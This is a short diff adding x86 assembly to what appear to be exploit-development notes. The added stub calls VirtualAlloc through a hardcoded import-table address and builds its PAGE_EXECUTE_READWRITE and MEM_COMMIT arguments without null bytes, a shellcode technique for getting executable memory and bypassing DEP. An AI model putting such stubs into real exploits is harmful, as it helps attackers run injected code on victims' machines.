@@ -17,3 +17,24 @@ match:
     mov eax, dword ptr [ebx]
     push eax
     ret
+
+
+example to call VirtualAlloc
+
+match:
+    xor eax, eax
+    mov al, 0x40        ; 0x40
+    push eax
+    mov eax, 0xffffefff ; -0x1001
+    neg eax             ; 0x1001
+    dec eax        
+    push eax            ; 0x1000
+    xor eax, eax
+    inc eax             ; 0x1
+    push eax
+    push edi
+    push edi
+    mov edx, 0x10032078  ; VirtualAlloc IAT
+    mov eax, dword ptr [edx]
+    push eax
+    ret
